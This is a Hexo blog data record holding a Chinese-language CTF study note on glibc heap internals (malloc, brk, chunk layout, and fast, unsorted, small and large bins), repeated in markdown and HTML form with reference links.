页\\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}\"></div>\n<script type=\"text/javascript\" src=\"https://viewer.diagrams.net/js/viewer-static.min.js\"></script>\n\n#### fast bin\n\n在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。**因此地址连续的两个chunk 被free到fast bin，他们不会被合并**。\n\n大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节\n\n新的chunk加入bin时，**fd**指向原来的栈顶\n\n#### unsorted bin\n\n大于global_max_fast（fast bin最大大小）的chunk都会放进来\n\n#### small bin\n\n存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin\n\n#### large bin\n\n大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列\n\n\n\n### 内存分配流程\n\n ![](/img/heapexploitation/1.jpg)\n\n### 内存释放流程\n\n ![](/img/heapexploitation/2.jpg)\n\n\n\n\n\n\n\n[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)\n\n[Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)\n\n[Syscalls used by malloc](https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/)\n\n[glibc 内存管理 ptmalloc 源代码分析](https://paper.seebug.org/papers/Archive/refs/heap/glibc内存管理ptmalloc源代码分析.pdf)\n\n[Painless intro to the Linux userland heap](https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/)","source":"_posts/ctf-pwn/heap exploitation.md","raw":"---\ntitle: Heap Exploitation\ntags: [ctf-pwn]\ndate: 2022-11-18 12:19:00\ncategories: [ctf-pwn]\nexcerpt: basic knowledge in heap exploitation\n---\n\n### malloc\n\n```c++\n#include <stdlib.h>\nvoid *malloc(size_t size);\n```\n\nsize = 0时，返回系统允许的最小内存块\n\n32位系统下malloc(0)分配8Bytes，64位分配16Bytes\n\n\n\n### brk\n\n堆段的起点和终点标识符：start_brk、brk（program brk)\n\n不开ASLR，初始时都指向bss段末尾（end_data)\n\n开启ASLR，会随机向后偏移一段距离\n\n`brk()`函数作用为抬高brk指针，获取一段heap\n\n程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  **main_arena**，后面malloc都会从main_arena中申请内存\n\n\n\n\n\n### chunk\n\n```C\nstruct malloc chunk{\n    INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).*/\n    INTERNAL_SIZE_T mchunk_size;      /* Size in bytes，including overhead.*/\n    struct malloc chunk* fd;          /* double links -- used only if free.*/\n    struct malloc chunk* bk;          /* Only used for large blocks: pointer to next larger size. */\n    struct malloc_chunk* fd_nextsize; /* double links -- used only if free.*/\n    struct malloc chunk* bk_nextsize;\n}\ntypedef struct malloc_chunk* mchunkptr;\n```\n\n\n\n#### allocated chunk\n\n`prevsize `：如果前一个chunk是free的***（这里指的是内存中的前一个，而不是freelist中的前一个）***，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节\n\n`size`：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的\n\n`userdata`：数据\n\n（下一个chunk的prevsize也会存储userdata）\n\n```C\n#define request2size(req) ...   //可以计算申请字节需要实际分配多少字节\n```\n\nchunk是在prevsize开始，但是malloc返回的指针指向userdata\n\n\n\n#### free chunk \n\n`prevsize`：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）\n\n`size`：同上\n\n`fd bk`：（在freelist中的）前一个/后一个chunk\n\n\n\n#### top chunk\n\n位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割\n\ntop chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆\n\n\n\n### Bin\n\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-17T04:09:19.532Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;ojfzveORWWdzC3RN6ooc\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;FyZdLwTWtfESSsWo7Yml\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}\"></div>\n<script type=\"text/javascript\" src=\"https://viewer.diagrams.net/js/viewer-static.min.js\"></script>\n\n#### fast bin\n\n在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。**因此地址连续的两个chunk 被free到fast bin，他们不会被合并**。\n\n大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节\n\n新的chunk加入bin时，**fd**指向原来的栈顶\n\n#### unsorted bin\n\n大于global_max_fast（fast bin最大大小）的chunk都会放进来\n\n#### small bin\n\n存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin\n\n#### large bin\n\n大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列\n\n\n\n### 内存分配流程\n\n ![](/img/heapexploitation/1.jpg)\n\n### 内存释放流程\n\n ![](/img/heapexploitation/2.jpg)\n\n\n\n\n\n\n\n[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)\n\n[Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)\n\n[Syscalls used by malloc](https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/)\n\n[glibc 内存管理 ptmalloc 源代码分析](https://paper.seebug.org/papers/Archive/refs/heap/glibc内存管理ptmalloc源代码分析.pdf)\n\n[Painless intro to the Linux userland heap](https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/)","slug":"ctf-pwn/heap exploitation","published":1,"updated":"2022-12-23T08:29:36.290Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969gk000b78uf0u5i118q","content":"<h3 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c++\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-function\"><span class=\"hljs-type\">void</span> *<span class=\"hljs-title\">malloc</span><span class=\"hljs-params\">(<span class=\"hljs-type\">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure>\n\n<p>size = 0时，返回系统允许的最小内存块</p>\n<p>32位系统下malloc(0)分配8Bytes，64位分配16Bytes</p>\n<h3 id=\"brk\"><a href=\"#brk\" class=\"headerlink\" title=\"brk\"></a>brk</h3><p>堆段的起点和终点标识符：start_brk、brk（program brk)</p>\n<p>不开ASLR，初始时都指向bss段末尾（end_data)</p>\n<p>开启ASLR，会随机向后偏移一段距离</p>\n<p><code>brk()</code>函数作用为抬高brk指针，获取一段heap</p>\n<p>程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  <strong>main_arena</strong>，后面malloc都会从main_arena中申请内存</p>\n<h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class=\"hljs-comment\">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class=\"hljs-comment\">/* Size in bytes，including overhead.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">fd</span>;</span>          <span class=\"hljs-comment\">/* double links -- used only if free.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">bk</span>;</span>          <span class=\"hljs-comment\">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">fd_nextsize</span>;</span> <span class=\"hljs-comment\">/* double links -- used only if free.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">bk_nextsize</span>;</span><br>&#125;<br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"allocated-chunk\"><a href=\"#allocated-chunk\" class=\"headerlink\" title=\"allocated chunk\"></a>allocated chunk</h4><p><code>prevsize </code>：如果前一个chunk是free的<em><strong>（这里指的是内存中的前一个，而不是freelist中的前一个）</strong></em>，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节</p>\n<p><code>size</code>：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的</p>\n<p><code>userdata</code>：数据</p>\n<p>（下一个chunk的prevsize也会存储userdata）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> request2size(req) ...   <span class=\"hljs-comment\">//可以计算申请字节需要实际分配多少字节</span></span><br></code></pre></td></tr></table></figure>\n\n<p>chunk是在prevsize开始，但是malloc返回的指针指向userdata</p>\n<h4 id=\"free-chunk\"><a href=\"#free-chunk\" class=\"headerlink\" title=\"free chunk\"></a>free chunk</h4><p><code>prevsize</code>：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）</p>\n<p><code>size</code>：同上</p>\n<p><code>fd bk</code>：（在freelist中的）前一个/后一个chunk</p>\n<h4 id=\"top-chunk\"><a href=\"#top-chunk\" class=\"headerlink\" title=\"top chunk\"></a>top chunk</h4><p>位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割</p>\n<p>top chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆</p>\n<h3 id=\"Bin\"><a href=\"#Bin\" class=\"headerlink\" title=\"Bin\"></a>Bin</h3><div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-17T04:09:19.532Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;ojfzveORWWdzC3RN6ooc\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;FyZdLwTWtfESSsWo7Yml\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}\"></div>\n<script type=\"text/javascript\" src=\"https://viewer.diagrams.net/js/viewer-static.min.js\"></script>\n\n<h4 id=\"fast-bin\"><a href=\"#fast-bin\" class=\"headerlink\" title=\"fast bin\"></a>fast bin</h4><p>在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。<strong>因此地址连续的两个chunk 被free到fast bin，他们不会被合并</strong>。</p>\n<p>大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节</p>\n<p>新的chunk加入bin时，<strong>fd</strong>指向原来的栈顶</p>\n<h4 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a>unsorted bin</h4><p>大于global_max_fast（fast bin最大大小）的chunk都会放进来</p>\n<h4 id=\"small-bin\"><a href=\"#small-bin\" class=\"headerlink\" title=\"small bin\"></a>small bin</h4><p>存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin</p>\n<h4 id=\"large-bin\"><a href=\"#large-bin\" class=\"headerlink\" title=\"large bin\"></a>large bin</h4><p>大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列</p>\n<h3 id=\"内存分配流程\"><a href=\"#内存分配流程\" class=\"headerlink\" title=\"内存分配流程\"></a>内存分配流程</h3><p> <img src=\"/img/heapexploitation/1.jpg\"></p>\n<h3 id=\"内存释放流程\"><a href=\"#内存释放流程\" class=\"headerlink\" title=\"内存释放流程\"></a>内存释放流程</h3><p> <img src=\"/img/heapexploitation/2.jpg\"></p>\n<p><a href=\"https://heap-exploitation.dhavalkapil.com/\">Heap Exploitation</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\">Understanding glibc malloc</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/\">Syscalls used by malloc</a></p>\n<p><a href=\"https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf\">glibc 内存管理 ptmalloc 源代码分析</a></p>\n<p><a href=\"https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/\">Painless intro to the Linux userland heap</a></p>\n","site":{"data":{}},"more":"<h3 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c++\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-function\"><span class=\"hljs-type\">void</span> *<span class=\"hljs-title\">malloc</span><span class=\"hljs-params\">(<span class=\"hljs-type\">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure>\n\n<p>size = 0时，返回系统允许的最小内存块</p>\n<p>32位系统下malloc(0)分配8Bytes，64位分配16Bytes</p>\n<h3 id=\"brk\"><a href=\"#brk\" class=\"headerlink\" title=\"brk\"></a>brk</h3><p>堆段的起点和终点标识符：start_brk、brk（program brk)</p>\n<p>不开ASLR，初始时都指向bss段末尾（end_data)</p>\n<p>开启ASLR，会随机向后偏移一段距离</p>\n<p><code>brk()</code>函数作用为抬高brk指针，获取一段heap</p>\n<p>程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  <strong>main_arena</strong>，后面malloc都会从main_arena中申请内存</p>\n<h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class=\"hljs-comment\">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class=\"hljs-comment\">/* Size in bytes，including overhead.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">fd</span>;</span>          <span class=\"hljs-comment\">/* double links -- used only if free.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">bk</span>;</span>          <span class=\"hljs-comment\">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">fd_nextsize</span>;</span> <span class=\"hljs-comment\">/* double links -- used only if free.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">bk_nextsize</span>;</span><br>&#125;<br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"allocated-chunk\"><a href=\"#allocated-chunk\" class=\"headerlink\" title=\"allocated chunk\"></a>allocated chunk</h4><p><code>prevsize </code>：如果前一个chunk是free的<em><strong>（这里指的是内存中的前一个，而不是freelist中的前一个）</strong></em>，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节</p>\n<p><code>size</code>：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的</p>\n<p><code>userdata</code>：数据</p>\n<p>（下一个chunk的prevsize也会存储userdata）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> request2size(req) ...   <span class=\"hljs-comment\">//可以计算申请字节需要实际分配多少字节</span></span><br></code></pre></td></tr></table></figure>\n\n<p>chunk是在prevsize开始，但是malloc返回的指针指向userdata</p>\n<h4 id=\"free-chunk\"><a href=\"#free-chunk\" class=\"headerlink\" title=\"free chunk\"></a>free chunk</h4><p><code>prevsize</code>：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）</p>\n<p><code>size</code>：同上</p>\n<p><code>fd bk</code>：（在freelist中的）前一个/后一个chunk</p>\n<h4 id=\"top-chunk\"><a href=\"#top-chunk\" class=\"headerlink\" title=\"top chunk\"></a>top chunk</h4><p>位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割</p>\n<p>top chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆</p>\n<h3 id=\"Bin\"><a href=\"#Bin\" class=\"headerlink\" title=\"Bin\"></a>Bin</h3><div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-17T04:09:19.532Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;ojfzveORWWdzC3RN6ooc\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;FyZdLwTWtfESSsWo7Yml\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}\"></div>\n<script type=\"text/javascript\" src=\"https://viewer.diagrams.net/js/viewer-static.min.js\"></script>\n\n<h4 id=\"fast-bin\"><a href=\"#fast-bin\" class=\"headerlink\" title=\"fast bin\"></a>fast bin</h4><p>在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。<strong>因此地址连续的两个chunk 被free到fast bin，他们不会被合并</strong>。</p>\n<p>大小范围：0x10-0x40 